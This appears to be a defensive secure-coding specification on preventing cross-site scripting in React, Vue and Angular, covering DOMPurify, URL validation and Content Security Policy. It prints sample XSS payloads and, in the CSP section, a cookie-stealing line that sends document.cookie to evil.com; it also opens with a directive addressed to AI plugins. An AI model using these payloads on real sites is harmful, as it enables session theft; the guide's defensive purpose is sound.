# XSS Prevention — Complete Specification

> **AI Plugin Directive:** When a developer asks "how to prevent XSS?", "dangerouslySetInnerHTML safe?", "sanitize HTML", "DOMPurify", "React XSS protection", "cross-site scripting", "template injection", "v-html security", "innerHTML risks", "script injection", or any XSS prevention question, ALWAYS consult this directive. Cross-Site Scripting (XSS) is the #1 frontend security vulnerability. React's JSX auto-escapes by default but `dangerouslySetInnerHTML` bypasses this protection. ALWAYS sanitize user-generated HTML with DOMPurify before rendering. NEVER trust user input — not in URLs, not in attributes, not in event handlers. ALWAYS combine output encoding with Content Security Policy (CSP) for defense in depth.

**Core Rule: NEVER render user-supplied content as raw HTML without sanitization. React JSX auto-escapes text content — this is your first line of defense. If you MUST render HTML (rich text, markdown, CMS content), ALWAYS sanitize with DOMPurify first. NEVER construct URLs from user input without validation (blocks `javascript:` protocol injection). EVERY application MUST deploy Content Security Policy headers to prevent inline script execution even if a sanitization bug exists.**

---

## 1. XSS Attack Types

```
  XSS ATTACK TAXONOMY

  ┌──────────────────────────────────────────────────────┐
  │                                                      │
  │  TYPE 1: REFLECTED XSS                               │
  │  ┌────────────────────────────────────────────────┐  │
  │  │  Attack payload in URL parameters              │  │
  │  │  Server reflects input back in response        │  │
  │  │  Example: /search?q=<script>alert(1)</script>  │  │
  │  │  FIX: Output encoding + CSP                    │  │
  │  └────────────────────────────────────────────────┘  │
  │                                                      │
  │  TYPE 2: STORED XSS                                  │
  │  ┌────────────────────────────────────────────────┐  │
  │  │  Attack payload saved in database              │  │
  │  │  Served to ALL users who view the content      │  │
  │  │  Example: Forum post with <img onerror=...>    │  │
  │  │  FIX: Sanitize on save + sanitize on render    │  │
  │  └────────────────────────────────────────────────┘  │
  │                                                      │
  │  TYPE 3: DOM-BASED XSS                               │
  │  ┌────────────────────────────────────────────────┐  │
  │  │  Attack manipulates client-side JavaScript     │  │
  │  │  No server involvement — client reads from     │  │
  │  │  URL hash, postMessage, localStorage           │  │
  │  │  Example: document.innerHTML = location.hash   │  │
  │  │  FIX: Never use innerHTML with untrusted data  │  │
  │  └────────────────────────────────────────────────┘  │
  │                                                      │
  │  SEVERITY: Stored > Reflected > DOM-based            │
  │  (Stored affects all users, not just click-targets)  │
  └──────────────────────────────────────────────────────┘
```

---

## 2. Framework Built-In Protections

### 2.1 React — Auto-Escaping

```tsx
// SAFE: React auto-escapes text content in JSX
function UserProfile({ name }: { name: string }) {
  // Even if name = "<script>alert('xss')</script>"
  // React renders it as text, NOT as HTML
  return <h1>{name}</h1>;
  // Output: <h1>&lt;script&gt;alert('xss')&lt;/script&gt;</h1>
}

// SAFE: Attributes are also auto-escaped
function Link({ url, text }: { url: string; text: string }) {
  return <a href={url} title={text}>{text}</a>;
  // Attribute values are escaped — no injection possible
}

// DANGEROUS: dangerouslySetInnerHTML BYPASSES auto-escaping
function RichContent({ html }: { html: string }) {
  // If html = '<img onerror="alert(1)" src="x">'
  // This WILL execute the onerror handler!
  return <div dangerouslySetInnerHTML={{ __html: html }} />;  // UNSAFE!
}
```

### 2.2 Vue — Template Auto-Escaping

```vue
<!-- SAFE: Vue auto-escapes {{ }} interpolation -->
<template>
  <h1>{{ userName }}</h1>
  <!-- Even if userName = "<script>alert(1)</script>" -->
  <!-- Renders as escaped text -->
</template>

<!-- DANGEROUS: v-html bypasses auto-escaping -->
<template>
  <div v-html="userBio"></div>  <!-- UNSAFE if userBio is untrusted! -->
</template>
```

### 2.3 Angular — Built-In Sanitization

```typescript
// Angular sanitizes by default — but bypassSecurityTrust* is DANGEROUS
@Component({
  template: `
    <!-- SAFE: Angular auto-sanitizes -->
    <div [innerHTML]="userContent"></div>

    <!-- DANGEROUS: bypasses sanitizer -->
    <div [innerHTML]="trustedContent"></div>
  `,
})
export class ContentComponent {
  userContent = '<script>alert(1)</script>';       // sanitized automatically
  trustedContent: SafeHtml;

  constructor(private sanitizer: DomSanitizer) {
    // DANGEROUS: Only use for content YOU control
    this.trustedContent = sanitizer.bypassSecurityTrustHtml(trustedHtml);
  }
}
```

---

## 3. DOMPurify — Safe HTML Rendering

```
  DOMAPURIFY FLOW

  ┌──────────────────────────────────────────────────────┐
  │                                                      │
  │  User input (untrusted HTML)                         │
  │  "<h1>Hello</h1><script>alert(1)</script>"           │
  │                          │                           │
  │                          ▼                           │
  │  DOMPurify.sanitize()                                │
  │  ┌────────────────────────────────────────────────┐  │
  │  │  Parses HTML into DOM tree                    │  │
  │  │  Walks every node and attribute               │  │
  │  │  Removes: <script>, onerror, javascript:      │  │
  │  │  Keeps: <h1>, <p>, <a href="">, <img src="">  │  │
  │  └────────────────────────────────────────────────┘  │
  │                          │                           │
  │                          ▼                           │
  │  Clean output                                        │
  │  "<h1>Hello</h1>"                                    │
  │  (script tag removed)                                │
  └──────────────────────────────────────────────────────┘
```

### 3.1 DOMPurify Setup

```typescript
import DOMPurify from 'dompurify';

// Basic sanitization
const dirty = '<img src="x" onerror="alert(1)"><b>Safe bold</b>';
const clean = DOMPurify.sanitize(dirty);
// Result: '<b>Safe bold</b>' (img with onerror removed)

// Custom configuration
const cleanHtml = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['h1', 'h2', 'h3', 'p', 'a', 'ul', 'ol', 'li', 'strong', 'em', 'code', 'pre', 'blockquote', 'img'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
  ALLOW_DATA_ATTR: false,                         // no data-* attributes
  ADD_TAGS: [],                                    // no extra tags
  FORBID_TAGS: ['style', 'script', 'iframe'],     // explicitly forbidden
  FORBID_ATTR: ['onerror', 'onload', 'onclick'],  // explicitly forbidden
});

// Strictest: only text content (strip ALL HTML)
const textOnly = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: [],                                // no tags at all
  ALLOWED_ATTR: [],
});
```

### 3.2 React + DOMPurify

```tsx
// SafeHtml component — reusable, always sanitizes
import DOMPurify from 'dompurify';

interface SafeHtmlProps {
  html: string;
  className?: string;
  allowedTags?: string[];
}

export function SafeHtml({ html, className, allowedTags }: SafeHtmlProps) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: allowedTags ?? [
      'h1', 'h2', 'h3', 'h4', 'p', 'a', 'ul', 'ol', 'li',
      'strong', 'em', 'code', 'pre', 'blockquote', 'img', 'br',
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
  });

  return (
    <div
      className={className}
      dangerouslySetInnerHTML={{ __html: clean }}
    />
  );
}

// Usage
function BlogPost({ content }: { content: string }) {
  return <SafeHtml html={content} />;     // always safe
}
```

### 3.3 Server-Side Sanitization (Node.js)

```typescript
// Sanitize on BOTH save and render for defense in depth
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// API route: sanitize before saving
app.post('/api/posts', async (req, res) => {
  const cleanContent = DOMPurify.sanitize(req.body.content, {
    ALLOWED_TAGS: ['h1', 'h2', 'h3', 'p', 'a', 'ul', 'ol', 'li',
                   'strong', 'em', 'code', 'pre', 'blockquote', 'img'],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title'],
  });

  await db.post.create({
    data: { ...req.body, content: cleanContent },
  });
});
```

---

## 4. URL-Based XSS Prevention

```typescript
// DANGER: javascript: protocol injection
const userUrl = 'javascript:alert(document.cookie)';

// UNSAFE: Rendering user-provided URL directly
<a href={userUrl}>Click me</a>  // executes JavaScript when clicked!

// SAFE: Validate URL protocol before rendering
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  const isSafe = /^https?:\/\//i.test(href) || href.startsWith('/') || href.startsWith('#');

  if (!isSafe) {
    console.warn(`Blocked potentially dangerous URL: ${href}`);
    return <span>{children}</span>;  // render as text, not link
  }

  return (
    <a href={href} rel="noopener noreferrer">
      {children}
    </a>
  );
}

// URL validation function
function isValidUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    // Relative URLs
    return url.startsWith('/') || url.startsWith('#');
  }
}
```

### 4.1 Dynamic Image Sources

```tsx
// UNSAFE: User-provided image URL could be data:text/html
<img src={userProvidedUrl} />

// SAFE: Validate image URL
function SafeImage({ src, alt }: { src: string; alt: string }) {
  const isValid =
    /^https?:\/\//i.test(src) ||                  // absolute HTTP(S)
    src.startsWith('/') ||                         // relative
    src.startsWith('data:image/');                 // data URI (images only)

  if (!isValid) {
    return <img src="/placeholder.png" alt={alt} />;
  }

  return <img src={src} alt={alt} />;
}
```

---

## 5. Common XSS Vectors and Mitigations

### 5.1 Event Handler Injection

```tsx
// UNSAFE: Dynamically creating event handlers from user input
const userScript = "alert('xss')";
<button onClick={() => eval(userScript)}>Click</button>;  // NEVER use eval

// SAFE: Use static event handlers
<button onClick={() => handleAction(userId)}>Click</button>;

// UNSAFE: DOM manipulation
document.getElementById('output')!.innerHTML = userInput;  // XSS!

// SAFE: Use textContent for text, DOMPurify for HTML
document.getElementById('output')!.textContent = userInput;  // auto-escaped
```

### 5.2 SVG-Based XSS

```html
<!-- SVG can contain scripts — dangerous when user-uploaded -->
<svg onload="alert('xss')">
  <circle r="50" />
</svg>

<svg>
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('xss')</script>
    </body>
  </foreignObject>
</svg>
```

```typescript
// SAFE: Sanitize SVG content
const cleanSvg = DOMPurify.sanitize(userSvg, {
  USE_PROFILES: { svg: true },                     // SVG-aware sanitization
  ADD_TAGS: ['svg', 'circle', 'rect', 'path', 'g', 'line', 'polygon'],
  FORBID_TAGS: ['script', 'foreignObject'],
  FORBID_ATTR: ['onload', 'onerror', 'onclick'],
});
```

### 5.3 PostMessage XSS

```typescript
// UNSAFE: Accepting messages from any origin
window.addEventListener('message', (event) => {
  document.innerHTML = event.data;  // XSS from malicious iframe
});

// SAFE: Verify origin and sanitize
window.addEventListener('message', (event) => {
  // 1. Check origin
  if (event.origin !== 'https://trusted-domain.com') {
    return;                                        // reject unknown origins
  }

  // 2. Validate message structure
  if (typeof event.data !== 'object' || !event.data.type) {
    return;
  }

  // 3. Handle known message types
  switch (event.data.type) {
    case 'update-content':
      const clean = DOMPurify.sanitize(event.data.html);
      container.innerHTML = clean;                 // sanitized
      break;
    default:
      console.warn('Unknown message type:', event.data.type);
  }
});
```

---

## 6. React-Specific XSS Patterns

### 6.1 dangerouslySetInnerHTML Audit

```tsx
// RULE: Every use of dangerouslySetInnerHTML MUST be wrapped in DOMPurify

// Search pattern for code review:
// grep -r "dangerouslySetInnerHTML" --include="*.tsx" --include="*.jsx" src/

// Every occurrence MUST look like this:
<div
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(untrustedHtml, SANITIZE_CONFIG),
  }}
/>

// NEVER like this:
<div dangerouslySetInnerHTML={{ __html: untrustedHtml }} />  // VULNERABLE
```

### 6.2 Markdown Rendering

```tsx
// SAFE: Use a Markdown library with built-in sanitization
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';

function MarkdownContent({ content }: { content: string }) {
  return (
    <ReactMarkdown
      rehypePlugins={[rehypeSanitize]}            // sanitizes output HTML
    >
      {content}
    </ReactMarkdown>
  );
}

// UNSAFE: Markdown → HTML without sanitization
import { marked } from 'marked';

function UnsafeMarkdown({ content }: { content: string }) {
  // marked converts markdown to HTML but does NOT sanitize
  return <div dangerouslySetInnerHTML={{ __html: marked(content) }} />;  // VULNERABLE
}

// SAFE: Markdown → HTML → DOMPurify
function SafeMarkdown({ content }: { content: string }) {
  const html = marked(content);
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

## 7. Content Security Policy (CSP) for XSS Mitigation

```
  CSP — DEFENSE IN DEPTH

  ┌──────────────────────────────────────────────────────┐
  │                                                      │
  │  Even if XSS payload gets past sanitization:         │
  │                                                      │
  │  WITHOUT CSP:                                        │
  │  <script>fetch('https://evil.com/steal?c='+          │
  │    document.cookie)</script>                         │
  │  → Cookie stolen ❌                                  │
  │                                                      │
  │  WITH CSP (script-src 'self'):                       │
  │  <script>...</script>                                │
  │  → Blocked by browser: "Refused to execute           │
  │    inline script because it violates CSP" ✅         │
  │                                                      │
  │  CSP prevents execution of injected scripts          │
  │  even when they are present in the DOM.              │
  └──────────────────────────────────────────────────────┘
```

```typescript
// Next.js CSP configuration
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'nonce-{NONCE}'",        // nonce for inline scripts
      "style-src 'self' 'unsafe-inline'",          // needed for CSS-in-JS
      "img-src 'self' data: https:",
      "font-src 'self'",
      "connect-src 'self' https://api.example.com",
      "frame-ancestors 'none'",                     // prevent clickjacking
      "base-uri 'self'",
      "form-action 'self'",
    ].join('; '),
  },
];
```

---

## 8. XSS Prevention Checklist by Context

| Context | Risk | Prevention |
|---|---|---|
| **Text in JSX `{}`** | Low (auto-escaped) | No action needed — React handles it |
| **`dangerouslySetInnerHTML`** | HIGH | DOMPurify.sanitize() with whitelist |
| **`v-html` (Vue)** | HIGH | DOMPurify.sanitize() before binding |
| **URL in `href`/`src`** | HIGH | Validate protocol (http/https only) |
| **Markdown rendering** | HIGH | rehype-sanitize plugin or DOMPurify |
| **Rich text editor output** | HIGH | DOMPurify on save AND render |
| **SVG content** | HIGH | DOMPurify with SVG profile |
| **postMessage handler** | MEDIUM | Verify origin, validate structure |
| **URL query parameters** | MEDIUM | Parse with URLSearchParams, encode output |
| **localStorage/sessionStorage** | MEDIUM | Sanitize before rendering stored data |
| **Third-party scripts** | MEDIUM | CSP + Subresource Integrity (SRI) |

---

## 9. Anti-Patterns

| Anti-Pattern | Symptom | Fix |
|---|---|---|
| **`dangerouslySetInnerHTML` without DOMPurify** | Raw user HTML rendered — any XSS payload executes | ALWAYS wrap in `DOMPurify.sanitize()` with strict whitelist |
| **`eval()` or `new Function()` with user input** | Arbitrary code execution from any user-controlled string | NEVER use eval — use JSON.parse for data, switch/case for logic |
| **No CSP headers** | Even if sanitization has a bug, scripts execute freely | Deploy CSP with `script-src 'self'` — blocks inline scripts |
| **Trusting URL parameters** | `document.innerHTML = new URLSearchParams(location.search).get('q')` | Sanitize or use `textContent` for user-controlled URL values |
| **`javascript:` URLs not blocked** | `<a href="javascript:alert(1)">` renders as clickable link | Validate URL protocol before rendering in `href` |
| **Sanitizing only on save** | XSS payload in database from before sanitization was added | Sanitize on BOTH save AND render (defense in depth) |
| **innerHTML for text content** | `el.innerHTML = userName` when `el.textContent = userName` suffices | Use `textContent` for text; `innerHTML` only with DOMPurify |
| **Trusting postMessage data** | Iframe from any origin can inject content | Verify `event.origin`, validate message structure |
| **No SRI on CDN scripts** | CDN compromise serves malicious script to all users | Add `integrity` attribute with hash to `<script>` tags |
| **Markdown rendered without sanitization** | `marked()` output used in `dangerouslySetInnerHTML` — XSS in markdown | Use rehype-sanitize with react-markdown or DOMPurify post-render |

---

## 10. Enforcement Checklist

### Code Patterns
- [ ] NO `dangerouslySetInnerHTML` without `DOMPurify.sanitize()` — grep codebase
- [ ] NO `eval()`, `new Function()`, `setTimeout(string)` with user input
- [ ] NO `innerHTML` assignment from user data — use `textContent` or DOMPurify
- [ ] NO `v-html` (Vue) with unsanitized user content
- [ ] NO `bypassSecurityTrustHtml` (Angular) with user content
- [ ] All user-provided URLs validated (http/https protocol only)
- [ ] All markdown rendering uses rehype-sanitize or DOMPurify
- [ ] All SVG content sanitized with DOMPurify SVG profile

### HTTP Headers
- [ ] Content-Security-Policy deployed (script-src restricts inline scripts)
- [ ] X-Content-Type-Options: nosniff (prevents MIME-type confusion)
- [ ] X-Frame-Options: DENY (prevents clickjacking)
- [ ] Referrer-Policy: strict-origin-when-cross-origin

### Infrastructure
- [ ] DOMPurify installed and configured with strict whitelist
- [ ] ESLint rule warns on `dangerouslySetInnerHTML` usage
- [ ] Content sanitized on BOTH save and render (defense in depth)
- [ ] postMessage handlers verify origin before processing
- [ ] Third-party scripts loaded with Subresource Integrity (SRI) hashes
